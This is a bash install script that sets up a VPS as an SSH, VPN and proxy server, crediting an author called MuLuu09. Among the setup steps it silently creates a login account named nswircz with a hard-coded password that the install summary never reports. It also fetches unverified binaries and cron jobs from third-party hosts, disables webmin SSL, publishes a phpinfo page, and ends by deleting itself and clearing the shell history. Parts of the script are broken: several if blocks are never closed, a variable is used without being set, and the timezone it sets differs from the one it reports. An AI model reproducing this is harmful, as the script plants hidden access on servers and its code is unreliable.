#!/bin/bash

# go to root
cd

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# install wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;

wget -O user-list http://rzserver.tk/source/user-list
if [ -f user-list ]; then
	mv user-list /usr/local/bin/
	chmod +x /usr/local/bin/user-list


wget -O menu http://rzserver.tk/source/menu
if [ -f menu ]; then
	mv menu /usr/local/bin/
	chmod +x /usr/local/bin/menu


wget -O monssh http://rzserver.tk/source/monssh
if [ -f monssh ]; then
	mv monssh /usr/local/bin/
	chmod +x /usr/local/bin/monssh


apt-get -y install fail2ban;service fail2ban restart;
wget http://prdownloads.sourceforge.net/webadmin/webmin_1.820_all.deb
dpkg -i --force-all webmin_1.8*.deb;
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart

sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net "http://rzserver.tk/source/banner"
service ssh restart;service sshd restart;

apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
service dropbear restart

apt-get -y install squid3
wget -O /etc/squid3/squid.conf "http://rzserver.tk/source/squid.conf"
sed -i "s/xxxxxxxxx/$myip/g" /etc/squid3/squid.conf
service squid3 restart

apt-get -y install nginx php5-fpm php5-cli
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "http://rzserver.tk/source/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup by MuLuu09 | telegram @MuLuu09 | whatsapp +601131731782</pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "http://rzserver.tk/source/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart

apt-get -y install openvpn
cd /etc/openvpn/
wget http://rzserver.tk/source/openvpn.tar
tar xf openvpn.tar
rm openvpn.tar
service openvpn restart
wget -O /etc/iptables.up.rules "http://rzserver.tk/source/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/xxxxxxxxx/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules

wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/MuluuJelekk/Muluu/master/client.ovpn"
sed -i "s/xxxxxxxxx/$myip/g" /home/vps/public_html/client.ovpn;
wget http://rzserver.tk/source/cronjob.tar;tar xf cronjob.tar
wget -O /home/vps/public_html/uptimes.php "http://rzserver.tk/source/uptimes.php"
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash nswircz
echo "nswircz:rzp" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
clear
cd
echo "#!/bin/bash

Keep Calm

# downlaod script
cd
wget -O speedtest_cli.py "https://raw.github.com/sivel/speedtest-cli/master/speedtest_cli.py"
wget -O bench-network.sh "https://raw.github.com/choirulanam217/script/master/conf/bench-network.sh"
wget -O ps_mem.py "https://raw.github.com/pixelb/ps_mem/master/ps_mem.py"
wget -O limit.sh "https://raw.github.com/choirulanam217/script/master/conf/limit.sh"
curl http://script.jualssh.com/user-login.sh > user-login.sh
curl http://script.jualssh.com/user-expire.sh > user-expire.sh
curl http://script.jualssh.com/user-limit.sh > user-limit.sh
echo "0 0 * * * root /root/user-expire.sh" > /etc/cron.d/user-expire
sed -i '$ i\screen -AmdS limit /root/limit.sh' /etc/rc.local
chmod +x bench-network.sh
chmod +x speedtest_cli.py
chmod +x ps_mem.py
chmod +x user-login.sh
chmod +x user-expire.sh
chmod +x user-limit.sh
chmod +x limit.sh

For support:-
Email: muluujelekk@gmail.com
SMS/Telegram/Whatsapp: +601131731782

" > /etc/update-motd.d/99-setup-credits
chmod 755 /etc/update-motd.d/99-setup-credits
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript MuLuu09"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "Squid3 : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Script command : menu"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "LOG INSTALL  --> /root/log-install.txt"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TAKE EFFECT !"  | tee -a log-install.txt
echo "========================================"  | tee -a log-install.txt
rm $0;rm *.deb;rm *.sh;rm *.tar;cat /dev/null > ~/.bash_history && history -c
